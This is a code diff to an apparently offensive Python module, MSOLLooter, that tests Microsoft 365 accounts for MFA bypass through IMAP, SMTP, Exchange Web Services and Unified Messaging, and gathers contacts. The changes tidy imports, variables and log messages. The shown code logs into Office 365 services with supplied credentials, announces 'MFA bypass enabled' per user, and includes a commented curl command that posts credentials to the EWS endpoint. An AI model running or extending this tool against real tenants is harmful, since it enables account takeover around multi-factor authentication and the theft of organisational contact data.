@@ -1,6 +1,5 @@
 import re
 import logging
-import requests
 from ..util import *
 from .base import Looter
 from contextlib import suppress
@@ -32,7 +31,7 @@ class MSOLLooter(Looter):
         try:
             session = IMAP4_SSL("outlook.office365.com", 993)
             log.debug(session.welcome.decode())
-            response = session.login(username, password)
+            session.login(username, password)
             log.success(f"MFA bypass (IMAP) enabled for {username}!")
             success = True
 
@@ -62,7 +61,7 @@ class MSOLLooter(Looter):
             try:
                 session = smtplib.SMTP(host)
                 log.debug(session.starttls())
-                response = session.login(username, password)
+                session.login(username, password)
                 log.success(f"MFA bypass (SMTP) enabled for {username}!")
                 success = True
                 break
@@ -114,13 +113,11 @@ class MSOLLooter(Looter):
             f"Testing Exchange Web Services (EWS) MFA bypass for {username} ({url})"
         )
         import csv
-        import poplib
         import string
         import datetime
         import exchangelib
         from exchangelib.errors import ErrorNameResolutionNoResults
 
-        success = False
         contacts_retrieved = 0
 
         # curl -v -H 'Content-Type: text/xml' https://outlook.office365.com/EWS/Exchange.asmx --user "BOB@EVILCORP.COM:Password123" --data-binary $'<?xml version=\'1.0\' encoding=\'utf-8\'?>\x0a<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\" xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\"><s:Header><t:RequestServerVersion Version=\"Exchange2019\"/></s:Header><s:Body><m:ResolveNames ReturnFullContactData=\"false\"><m:UnresolvedEntry>BOB@EVILCORP.COM</m:UnresolvedEntry></m:ResolveNames></s:Body></s:Envelope>'
@@ -136,7 +133,6 @@ class MSOLLooter(Looter):
                 access_type=exchangelib.DELEGATE,
             )
             log.success(f"MFA bypass (EWS) enabled for {username}!")
-            success = True
 
             try:
                 found = set()
@@ -278,7 +274,9 @@ class MSOLLooter(Looter):
                                 )
                                 lzx_found = True
                             except Exception as e:
-                                log.warning(f"Failed to retrieve LZX file at {lzx_url}")
+                                log.warning(
+                                    f"Failed to retrieve LZX file at {lzx_url}: {e}"
+                                )
                     if not lzx_found:
                         log.warning(f"No LZX link found for {username}")
 
@@ -390,7 +388,7 @@ class MSOLLooter(Looter):
 
             if getattr(
                 response, "status_code", 0
-            ) != 401 and "text/xml" in response.headers.get("Content-Type"):
+            ) != 401 and "text/xml" in response_headers.get("Content-Type"):
                 log.success(
                     f"MFA bypass (Unified Messaging) enabled for {username}! ({url})"
                 )
